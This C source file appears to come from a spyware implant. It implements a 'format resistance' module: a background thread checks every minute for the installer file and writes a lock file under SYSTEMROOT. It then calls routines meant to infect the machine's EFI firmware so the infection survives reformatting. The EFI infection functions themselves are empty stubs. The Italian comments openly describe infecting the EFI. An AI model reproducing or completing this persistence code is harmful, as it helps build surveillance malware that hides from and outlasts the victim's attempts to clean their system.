#include <windows.h>
#include "common.h"
#include "H4-DLL.h"
#include "UnHookClass.h"

BOOL is_format_resistant = FALSE;

BOOL IsFiles()
{
	HANDLE hFile;
	char obj_string[MAX_PATH];

	// Verifica che esista il file dell'installer
	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hFile);
	return TRUE;
}

// Torna TRUE se il file di lock c'e' gia' o se e'riuscito a crearlo
#define LOCK_FORMAT_FILE "\\.flck"
BOOL CheckCreateLock()
{
	HANDLE hFile;
	char obj_string[MAX_PATH];

	// Verifica se esiste gia' il file di lock
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", obj_string, sizeof(obj_string));
	strcat_s(obj_string, LOCK_FORMAT_FILE);
	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return TRUE;
	}
	
	hFile = CreateFile(obj_string, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return TRUE;
	}

	return FALSE;
}

// Chiama il driver per vedere se l'EFI e' gia' infetto
BOOL IsEFIInfected()
{
	// XXX
	return FALSE;
}

// Chiama il driver per vedere infettare l'EFI
void InfectEFI()
{
	// XXX
}

#define FORMAT_RESISTANCE_TIME 60000
DWORD WINAPI MonitorFormatStatus(DWORD dummy)
{
	HideDevice dev_unhook;
	LOOP {
		if (is_format_resistant && IsFiles()) 
			//if (dev_unhook.unhook_isdrv(DRIVER_NAME_W))
				if (CheckCreateLock() && !IsEFIInfected())
					InfectEFI();
		Sleep(FORMAT_RESISTANCE_TIME);
	}
}

void StartFormatThread()
{
	DWORD dummy;
	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorFormatStatus, NULL, 0, &dummy);
}

void SetFormatResistant(BOOL param)
{
	is_format_resistant = param;
}
